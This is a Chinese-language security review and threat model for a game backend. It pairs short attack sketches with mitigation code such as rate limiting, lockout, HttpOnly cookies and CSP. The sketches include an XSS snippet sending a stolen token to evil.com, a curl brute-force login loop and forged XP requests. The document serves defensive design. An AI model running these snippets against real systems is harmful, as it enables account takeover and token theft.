# 安全性考量與防作弊機制

**版本**: 1.0
**日期**: 2026-02-12
**審查者**: Software Architect
**評級**: ⚠️ **需強化**

---

## 安全性評估總覽

### ✅ 已實作

1. **JWT Token 認證**：所有 API 需驗證 Token
2. **Firestore Security Rules**：前端無法直接寫入
3. **密碼 Hash**：使用 bcrypt 儲存密碼
4. **Session ID 驗證**：防止重複提交遊戲結果

### ⚠️ 需強化

1. **密碼強度過低**：遊戲註冊允許 4-8 字元，易被暴力破解
2. **缺少 Rate Limiting**：API 無請求頻率限制
3. **防作弊不足**：經驗值計算可被操控
4. **IP 註冊限制易繞過**：使用 VPN 可突破每日 3 次限制

### ❌ 嚴重問題

**無嚴重安全漏洞**，但需儘速實作以下強化措施。

---

## 威脅模型分析

### 攻擊場景 1: 刷經驗值

**攻擊手法**:
```javascript
// 攻擊者修改前端 JavaScript
fetch('/api/game/complete', {
  method: 'POST',
  headers: {
    'Authorization': 'Bearer valid_token',
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    characterId: 'char_123',
    skillId: 'english-typing',
    levelId: 'advanced',
    performance: {
      playTime: 60,      // 偽造 60 分鐘
      accuracy: 1.0,     // 100% 正確率
      wpm: 150           // 超高速度
    },
    metadata: {
      sessionId: `fake_${Date.now()}`, // 隨機生成
      startTime: Date.now() - 3600000,
      endTime: Date.now()
    }
  })
});

// 每分鐘執行一次，一天可獲得 1440 * 100 = 144,000 經驗值
```

**風險等級**: 🔴 **高**

**緩解措施**:

#### 1. 後端時間驗證（已在規格中）

```typescript
// validators/anti-cheat.validator.ts

@Injectable()
export class AntiCheatValidator {
  async validate(dto: GameCompleteDto, metadata: GameMetadata): Promise<void> {
    // 1. 驗證實際時間與宣稱時間一致性
    const actualDuration = (metadata.endTime - metadata.startTime) / 60000;
    const diff = Math.abs(actualDuration - dto.performance.playTime);

    if (diff / dto.performance.playTime > 0.2) {
      throw new BadRequestException('遊玩時間不合理');
    }

    // 2. 驗證 startTime 不能是未來時間
    if (metadata.startTime > Date.now()) {
      throw new BadRequestException('開始時間異常');
    }

    // 3. 驗證遊戲時間不能過長（防止掛機刷時間）
    if (dto.performance.playTime > 120) { // 最多 2 小時
      throw new BadRequestException('單次遊玩時間過長');
    }
  }
}
```

#### 2. Rate Limiting（⚠️ 必須實作）

```typescript
// common/guards/rate-limit.guard.ts

import { Injectable, CanActivate, ExecutionContext, HttpException } from '@nestjs/common';
import { RedisService } from '../services/redis.service'; // 或用 in-memory cache

@Injectable()
export class RateLimitGuard implements CanActivate {
  constructor(private readonly redis: RedisService) {}

  async canActivate(context: ExecutionContext): Promise<boolean> {
    const request = context.switchToHttp().getRequest();
    const characterId = request.user.sub;
    const key = `rate_limit:game_complete:${characterId}`;

    const count = await this.redis.get(key);

    if (count && parseInt(count) >= 10) {
      throw new HttpException('請求過於頻繁，請稍後再試', 429);
    }

    await this.redis.incr(key);
    await this.redis.expire(key, 60); // 1 分鐘

    return true;
  }
}

// 套用到 API
@Post('complete')
@UseGuards(JwtAuthGuard, RateLimitGuard)
async complete(@Body() dto: GameCompleteDto) { ... }
```

**限制**:
- 每個角色每分鐘最多 10 次 game complete 請求
- 每個 IP 每分鐘最多 30 次 API 請求

#### 3. 異常偵測系統（建議實作）

```typescript
// services/anomaly-detection.service.ts

@Injectable()
export class AnomalyDetectionService {
  async checkAnomalies(characterId: string, session: GameSession): Promise<void> {
    // 1. 檢查單位時間內經驗值是否異常
    const oneHourAgo = new Date(Date.now() - 3600000);
    const recentSessions = await this.db
      .collection('game_sessions')
      .where('characterId', '==', characterId)
      .where('createdAt', '>=', oneHourAgo)
      .get();

    const totalExpInHour = recentSessions.docs.reduce(
      (sum, doc) => sum + doc.data().result.expGained,
      0
    );

    if (totalExpInHour > 1000) {
      // 標記為可疑
      await this.flagSuspiciousActivity(characterId, {
        reason: 'exp_spike',
        expInHour: totalExpInHour,
        timestamp: new Date(),
      });

      // 通知管理員
      await this.notifyAdmin({
        characterId,
        reason: '單小時經驗值異常',
        details: `獲得 ${totalExpInHour} 經驗值`,
      });
    }

    // 2. 檢查正確率是否始終過高（>95%）
    const avgAccuracy = recentSessions.docs.reduce(
      (sum, doc) => sum + (doc.data().performance.accuracy || 0),
      0
    ) / recentSessions.size;

    if (avgAccuracy > 0.95 && recentSessions.size > 10) {
      await this.flagSuspiciousActivity(characterId, {
        reason: 'perfect_accuracy',
        avgAccuracy,
        sessionCount: recentSessions.size,
      });
    }
  }
}
```

---

### 攻擊場景 2: 帳號盜取

**攻擊手法**:
```bash
# 暴力破解遊戲註冊帳號（密碼僅 4-8 字元）
for password in {aaaa..zzzz}; do
  curl -X POST /api/auth/login \
    -d "identifier=target_user&password=$password"
done

# 預估：26^4 = 456,976 種組合，無 rate limiting 可在數小時內破解
```

**風險等級**: 🔴 **高**

**緩解措施**:

#### 1. 提高密碼強度要求（⚠️ 建議修改規格）

```typescript
// dto/register-simple.dto.ts

export class RegisterSimpleDto {
  @IsString()
  @Length(4, 16)
  @Matches(/^[a-zA-Z0-9_]+$/)
  username: string;

  @IsString()
  @Length(6, 20) // ⚠️ 改為 6-20 字元
  @Matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)[a-zA-Z\d]{6,}$/, {
    message: '密碼必須包含大小寫字母與數字'
  })
  password: string;
}
```

**建議規格修正**:
- 密碼長度：~~4-8 字元~~ → **6-20 字元**
- 密碼規則：必須包含大小寫字母與數字
- 或：僅保留完整註冊（Email + 強密碼），取消遊戲註冊

#### 2. 登入 Rate Limiting

```typescript
// guards/login-rate-limit.guard.ts

@Injectable()
export class LoginRateLimitGuard implements CanActivate {
  async canActivate(context: ExecutionContext): Promise<boolean> {
    const request = context.switchToHttp().getRequest();
    const ip = request.ip;
    const identifier = request.body.identifier;

    // 1. IP 層級限制（每分鐘最多 5 次）
    const ipKey = `login_attempts:ip:${ip}`;
    const ipAttempts = await this.redis.get(ipKey);

    if (ipAttempts && parseInt(ipAttempts) >= 5) {
      throw new HttpException('登入嘗試過於頻繁', 429);
    }

    await this.redis.incr(ipKey);
    await this.redis.expire(ipKey, 60);

    // 2. 帳號層級限制（每 5 分鐘最多 3 次）
    const accountKey = `login_attempts:account:${identifier}`;
    const accountAttempts = await this.redis.get(accountKey);

    if (accountAttempts && parseInt(accountAttempts) >= 3) {
      throw new HttpException('此帳號暫時鎖定，請 5 分鐘後再試', 403);
    }

    await this.redis.incr(accountKey);
    await this.redis.expire(accountKey, 300);

    return true;
  }
}
```

#### 3. 帳號鎖定機制

```typescript
// auth.service.ts

async login(dto: LoginDto): Promise<AuthResponse> {
  const character = await this.getCharacterByIdentifier(dto.identifier);

  // 檢查帳號是否被鎖定
  if (character.lockUntil && character.lockUntil > new Date()) {
    throw new ForbiddenException('帳號已鎖定，請稍後再試');
  }

  // 驗證密碼
  const isPasswordValid = await bcrypt.compare(dto.password, character.passwordHash);

  if (!isPasswordValid) {
    // 失敗次數 +1
    character.failedAttempts = (character.failedAttempts || 0) + 1;

    // 連續失敗 5 次 → 鎖定 30 分鐘
    if (character.failedAttempts >= 5) {
      character.lockUntil = new Date(Date.now() + 30 * 60 * 1000);
    }

    await this.updateCharacter(character.id, {
      failedAttempts: character.failedAttempts,
      lockUntil: character.lockUntil,
    });

    throw new UnauthorizedException('密碼錯誤');
  }

  // 登入成功，重設失敗次數
  await this.updateCharacter(character.id, {
    failedAttempts: 0,
    lockUntil: null,
  });

  return this.generateToken(character);
}
```

---

### 攻擊場景 3: IP 註冊限制繞過

**攻擊手法**:
```bash
# 使用 VPN 切換 IP，繞過每日 3 次註冊限制
for i in {1..100}; do
  # 切換 VPN
  vpn_switch

  # 註冊新帳號
  curl -X POST /api/auth/register-simple \
    -d "username=bot$i&password=pass1234&characterName=Bot$i"
done
```

**風險等級**: 🟡 **中**

**緩解措施**:

#### 1. 裝置指紋（Device Fingerprinting）

```typescript
// 前端收集裝置資訊
import FingerprintJS from '@fingerprintjs/fingerprintjs';

const fp = await FingerprintJS.load();
const result = await fp.get();

// 註冊時傳送 visitorId
await authService.registerSimple({
  username: 'user123',
  password: 'pass1234',
  deviceId: result.visitorId, // 裝置指紋
});

// 後端檢查
const registrationsToday = await db.collection('characters')
  .where('deviceId', '==', dto.deviceId)
  .where('createdAt', '>=', today)
  .get();

if (registrationsToday.size >= 3) {
  throw new ForbiddenException('此裝置今日註冊次數已達上限');
}
```

#### 2. Email 驗證（建議）

```typescript
// 遊戲註冊也要求 Email（可選填，但驗證後才能獲得獎勵）
interface RegisterSimpleDto {
  username: string;
  password: string;
  email?: string; // 可選
}

// 未驗證 Email 的帳號：
// - 可以遊玩
// - 可以獲得經驗值
// - 無法獲得獎勵（虛擬貨幣）
// - 無法兌換獎品

if (!character.emailVerified && rewardEarned > 0) {
  return {
    ...result,
    rewardEarned: 0,
    message: '請驗證 Email 後才能獲得獎勵',
  };
}
```

---

### 攻擊場景 4: JWT Token 竊取

**攻擊手法**:
```javascript
// XSS 攻擊
<script>
  // 竊取 localStorage 中的 token
  const token = localStorage.getItem('auth-storage');
  fetch('https://evil.com/steal?token=' + token);
</script>

// CSRF 攻擊（若 token 存在 cookie）
<img src="/api/rewards/redeem?itemId=expensive_item" />
```

**風險等級**: 🟡 **中**

**緩解措施**:

#### 1. HttpOnly Cookie（推薦）

```typescript
// 後端設定 HttpOnly Cookie（JavaScript 無法存取）
@Post('login')
async login(@Body() dto: LoginDto, @Res() res: Response) {
  const { token, character } = await this.authService.login(dto);

  res.cookie('auth_token', token, {
    httpOnly: true,    // 防止 JavaScript 存取
    secure: true,      // 僅 HTTPS
    sameSite: 'strict', // 防止 CSRF
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 天
  });

  res.json({ success: true, character });
}

// 前端自動帶上 cookie，無需手動管理
```

#### 2. CSRF Protection

```typescript
// 安裝 CSRF 保護
import * as csurf from 'csurf';

app.use(csurf({ cookie: true }));

// 前端取得 CSRF Token
const csrfToken = document.querySelector('meta[name="csrf-token"]').content;

// 所有 POST 請求帶上 token
fetch('/api/game/complete', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': csrfToken,
  },
  body: JSON.stringify(data),
});
```

#### 3. Content Security Policy (CSP)

```typescript
// 設定 CSP Header
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; " +
    "script-src 'self' 'unsafe-inline'; " + // 僅允許同源或內嵌腳本
    "style-src 'self' 'unsafe-inline'; " +
    "img-src 'self' data: https:; " +
    "connect-src 'self' https://firestore.googleapis.com"
  );
  next();
});
```

---

### 攻擊場景 5: Session Replay（重播攻擊）

**攻擊手法**:
```javascript
// 攔截合法的遊戲完成請求
const validRequest = {
  characterId: 'char_123',
  skillId: 'english-typing',
  levelId: 'advanced',
  performance: { playTime: 15, accuracy: 0.95, wpm: 80 },
  metadata: {
    sessionId: 'session_abc',
    startTime: 1707700000000,
    endTime: 1707700900000
  }
};

// 重複提交相同請求（刷經驗值）
for (let i = 0; i < 100; i++) {
  fetch('/api/game/complete', {
    method: 'POST',
    body: JSON.stringify(validRequest)
  });
}
```

**風險等級**: 🟢 **低**（已有防護）

**現有防護**:

```typescript
// validators/anti-cheat.validator.ts

async validate(dto: GameCompleteDto, metadata: GameMetadata): Promise<void> {
  // 檢查 sessionId 是否已使用過
  const existingSession = await this.firebaseService
    .collection('game_sessions')
    .where('metadata.sessionId', '==', metadata.sessionId)
    .get();

  if (!existingSession.empty) {
    throw new ConflictException('此 session 已提交過結果');
  }
}
```

**強化建議**:

```typescript
// 加上時間戳驗證（防止舊 session 被重播）
if (metadata.endTime < Date.now() - 5 * 60 * 1000) {
  throw new BadRequestException('Session 已過期');
}
```

---

## 敏感資料加密

### 1. 密碼儲存（bcrypt）

```typescript
// ✅ 正確做法
import * as bcrypt from 'bcrypt';

const saltRounds = 10;
const passwordHash = await bcrypt.hash(password, saltRounds);

// 儲存到 Firestore
await db.collection('characters').doc(characterId).set({
  passwordHash, // 僅儲存 hash
});

// ❌ 錯誤做法
await db.collection('characters').doc(characterId).set({
  password: password, // 明文儲存 ❌
});
```

### 2. 敏感欄位加密（AES）

```typescript
// 若需儲存敏感資料（如家長的手機號碼），需加密
import * as crypto from 'crypto';

const algorithm = 'aes-256-gcm';
const key = Buffer.from(process.env.ENCRYPTION_KEY, 'hex'); // 32 bytes

function encrypt(text: string): { encrypted: string; iv: string; tag: string } {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv(algorithm, key, iv);

  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');

  const tag = cipher.getAuthTag();

  return {
    encrypted,
    iv: iv.toString('hex'),
    tag: tag.toString('hex'),
  };
}

function decrypt(encrypted: string, iv: string, tag: string): string {
  const decipher = crypto.createDecipheriv(
    algorithm,
    key,
    Buffer.from(iv, 'hex')
  );
  decipher.setAuthTag(Buffer.from(tag, 'hex'));

  let decrypted = decipher.update(encrypted, 'hex', 'utf8');
  decrypted += decipher.final('utf8');

  return decrypted;
}
```

---

## 管理員權限控制

### 1. Firebase Custom Claims

```typescript
// 設定管理員權限
import * as admin from 'firebase-admin';

await admin.auth().setCustomUserClaims(uid, {
  admin: true,
  role: 'admin',
});

// 驗證管理員權限
@Injectable()
export class AdminGuard implements CanActivate {
  async canActivate(context: ExecutionContext): Promise<boolean> {
    const request = context.switchToHttp().getRequest();
    const user = request.user;

    // 檢查 JWT Token 中的 custom claims
    if (!user.admin) {
      throw new ForbiddenException('需要管理員權限');
    }

    return true;
  }
}

// 套用到管理員 API
@Controller('api/admin')
@UseGuards(JwtAuthGuard, AdminGuard)
export class AdminController { ... }
```

### 2. 管理員操作日誌

```typescript
// 記錄所有管理員操作
@Injectable()
export class AdminAuditInterceptor implements NestInterceptor {
  intercept(context: ExecutionContext, next: CallHandler): Observable<any> {
    const request = context.switchToHttp().getRequest();
    const adminId = request.user.sub;

    const log = {
      adminId,
      action: `${request.method} ${request.url}`,
      body: request.body,
      timestamp: new Date(),
    };

    // 寫入 Firestore
    this.db.collection('admin_audit_logs').add(log);

    return next.handle();
  }
}
```

---

## 輸入驗證

### 1. DTO 驗證（class-validator）

```typescript
// dto/game-complete.dto.ts

export class GameCompleteDto {
  @IsString()
  @IsNotEmpty()
  characterId: string;

  @IsString()
  @IsNotEmpty()
  skillId: string;

  @IsString()
  @IsNotEmpty()
  levelId: string;

  @ValidateNested()
  @Type(() => GamePerformanceDto)
  performance: GamePerformanceDto;

  @ValidateNested()
  @Type(() => GameMetadataDto)
  metadata: GameMetadataDto;
}

export class GamePerformanceDto {
  @IsNumber()
  @Min(0)
  @Max(180) // 最多 3 小時
  playTime: number;

  @IsOptional()
  @IsNumber()
  @Min(0)
  @Max(1)
  accuracy?: number;

  @IsOptional()
  @IsNumber()
  @Min(0)
  @Max(300) // 最高 300 WPM
  wpm?: number;
}
```

### 2. SQL Injection 防護

```typescript
// ✅ Firestore 天生防 SQL Injection（NoSQL）
const character = await db.collection('characters')
  .where('username', '==', username) // 參數化查詢
  .get();

// 若使用 raw query（極少情況），需參數化
const query = db.collection('characters')
  .where('username', '==', sanitize(username));
```

---

## 安全檢查清單

### 部署前必須完成

- [ ] **密碼強度提高至 6-20 字元，包含大小寫與數字**
- [ ] **實作 Rate Limiting（登入、遊戲完成、API）**
- [ ] **實作 CSRF Protection**
- [ ] **設定 Content Security Policy**
- [ ] **JWT Token 改用 HttpOnly Cookie**
- [ ] **實作帳號鎖定機制（連續失敗 5 次）**
- [ ] **實作異常偵測系統（經驗值異常告警）**
- [ ] **建立管理員操作日誌**

### 定期檢查

- [ ] **每月檢查 Firestore Security Rules**
- [ ] **每季進行滲透測試**
- [ ] **每週檢查異常帳號（經驗值/獎勵異常）**
- [ ] **定期更新依賴套件（npm audit）**

---

## 安全事件回應流程

### 1. 發現可疑活動

```
異常偵測系統觸發 → Cloud Monitoring Alert → 管理員收到通知
```

### 2. 調查與處理

```typescript
// 查詢可疑帳號的所有操作
const suspiciousLogs = await db.collection('game_sessions')
  .where('characterId', '==', suspiciousCharacterId)
  .orderBy('createdAt', 'desc')
  .limit(100)
  .get();

// 暫停帳號
await db.collection('characters').doc(suspiciousCharacterId).update({
  status: 'suspended',
  suspendedAt: FieldValue.serverTimestamp(),
  suspendReason: '經驗值異常',
});
```

### 3. 通知使用者

```typescript
// 發送 Email 通知
await this.emailService.send({
  to: character.email,
  subject: '帳號已暫停',
  body: '您的帳號因異常活動已暫停，請聯絡管理員。',
});
```

---

## 總結

✅ **JWT 認證、Firestore Security Rules 基礎已完善**
⚠️ **密碼強度過低，建議提高至 6-20 字元**
⚠️ **必須實作 Rate Limiting 防止 API 濫用**
⚠️ **必須實作異常偵測系統防止刷經驗值**
⚠️ **建議使用 HttpOnly Cookie 儲存 Token**

**安全性等級**: ⚠️ **中等**（實作上述強化措施後可提升至高）

**預估開發時間**:
- Rate Limiting: 2 天
- CSRF Protection: 1 天
- 異常偵測系統: 3 天
- 帳號鎖定機制: 1 天
- 管理員操作日誌: 1 天
- **Total**: 8 天

---

**建議優先順序**:
1. ⚠️ **Rate Limiting（最高優先）**
2. ⚠️ **密碼強度提高（修改規格）**
3. 異常偵測系統
4. CSRF Protection
5. HttpOnly Cookie
6. 帳號鎖定機制
